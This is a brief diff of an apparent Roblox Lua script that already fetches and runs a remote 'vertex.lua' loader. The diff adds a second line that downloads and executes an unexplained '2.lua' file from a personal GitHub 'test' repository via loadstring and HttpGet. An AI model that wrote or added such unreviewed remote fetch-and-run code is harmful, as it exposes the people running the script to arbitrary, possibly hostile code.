@@ -32,6 +32,7 @@ end
 task.spawn(selectDevice)
 task.wait(10)
 loadstring(game:HttpGet('https://raw.smokingscripts.org/vertex.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/gleb228666999/test/refs/heads/main/2.lua'))()
 
 
 
